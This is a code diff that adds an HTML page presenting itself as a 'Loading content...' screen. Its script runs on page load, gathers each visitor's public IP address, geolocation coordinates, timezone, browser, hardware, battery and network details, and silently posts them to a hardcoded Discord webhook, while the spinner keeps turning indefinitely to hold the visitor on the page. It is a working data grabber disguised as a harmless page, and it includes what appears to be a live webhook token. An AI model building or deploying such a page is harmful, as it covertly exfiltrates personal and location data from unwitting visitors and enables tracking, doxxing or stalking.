@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+
+<style>
+body{
+    background:#0f0f0f;
+    color:white;
+    font-family:Arial,sans-serif;
+    margin:0;
+    padding:0;
+    height:100vh;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+    overflow:hidden;
+}
+
+.loader {
+    width: 80px;
+    height: 80px;
+    border: 8px solid #333;
+    border-top: 8px solid #fff;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.loading-text {
+    font-size: 18px;
+    margin-bottom: 10px;
+}
+
+.loading-subtext {
+    font-size: 14px;
+    color: #aaa;
+    max-width: 400px;
+    text-align: center;
+}
+</style>
+</head>
+<body>
+
+<div class="loading-container">
+    <div class="loader"></div>
+    <div class="loading-text">Loading content...</div>
+    <div class="loading-subtext">This may take a few moments. Please wait while we prepare your experience.</div>
+</div>
+
+<script>
+
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1512218769026715809/qOI8l5jlBoH37WUEYqqNwmlGf4i9nzmqLYptSIVjh8h06pIMCP3VjTlPwNOYV7lR5PAB";
+
+async function sendDeviceInfoToWebhook() {
+    try {
+        // Collect device information
+        let ip = "Unable to load";
+        try {
+            const ipResponse = await fetch("https://api.ipify.org?format=json");
+            const ipData = await ipResponse.json();
+            ip = ipData.ip;
+        } catch (e) {
+            console.error("Failed to fetch IP:", e);
+        }
+
+        let location = "Location access denied";
+        try {
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject);
+            });
+            location = `${position.coords.latitude}, ${position.coords.longitude}`;
+        } catch (e) {
+            console.error("Failed to get location:", e);
+        }
+
+        let battery = "Not available";
+        let charging = "Not available";
+        try {
+            if ("getBattery" in navigator) {
+                const batteryData = await navigator.getBattery();
+                battery = Math.round(batteryData.level * 100) + "%";
+                charging = batteryData.charging ? "Yes" : "No";
+            }
+        } catch (e) {
+            console.error("Failed to get battery info:", e);
+        }
+
+        let network = "Not available";
+        let latency = "Not available";
+        try {
+            if (navigator.connection) {
+                network = navigator.connection.effectiveType;
+                latency = navigator.connection.rtt + " ms";
+            }
+        } catch (e) {
+            console.error("Failed to get network info:", e);
+        }
+
+        const deviceInfo = {
+            ip: "Public IP: " + ip,
+            location: "Location: " + location,
+            timezone: "Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone,
+            time: "Local Time: " + new Date().toString(),
+            browser: "User Agent: " + navigator.userAgent,
+            platform: "Platform: " + navigator.platform,
+            language: "Primary Language: " + navigator.language,
+            languages: "Languages: " + navigator.languages.join(", "),
+            cookies: "Cookies Enabled: " + navigator.cookieEnabled,
+            darkmode: "Dark Mode: " + window.matchMedia("(prefers-color-scheme: dark)").matches,
+            screen: "Screen Resolution: " + screen.width + " x " + screen.height,
+            available: "Available Screen: " + screen.availWidth + " x " + screen.availHeight,
+            window: "Window Size: " + window.innerWidth + " x " + window.innerHeight,
+            colordepth: "Color Depth: " + screen.colorDepth,
+            pixelratio: "Pixel Ratio: " + window.devicePixelRatio,
+            touch: "Touch Support: " + ("ontouchstart" in window),
+            cores: "CPU Cores: " + navigator.hardwareConcurrency,
+            memory: "Device Memory: " + (navigator.deviceMemory || "Unknown") + " GB",
+            online: "Online: " + navigator.onLine,
+            network: "Network Type: " + network,
+            latency: "Estimated Latency: " + latency,
+            battery: "Battery: " + battery,
+            charging: "Charging: " + charging
+        };
+
+        // Create Discord embed
+        const embed = {
+            title: "Device Information",
+            color: 0x3498db, // Blue color
+            fields: Object.entries(deviceInfo).map(([key, value]) => ({
+                name: key.charAt(0).toUpperCase() + key.slice(1),
+                value: value || "Not available",
+                inline: false
+            })),
+            timestamp: new Date().toISOString()
+        };
+
+        const payload = {
+            embeds: [embed]
+        };
+
+        // Send to Discord webhook
+        await fetch(DISCORD_WEBHOOK_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        });
+
+        console.log("Device information sent successfully");
+    } catch (error) {
+        console.error("Error sending device information:", error);
+    }
+}
+
+// Send info immediately when page loads
+sendDeviceInfoToWebhook();
+
+// Keep showing the loading screen indefinitely
+</script>
+
+</body>
+</html>
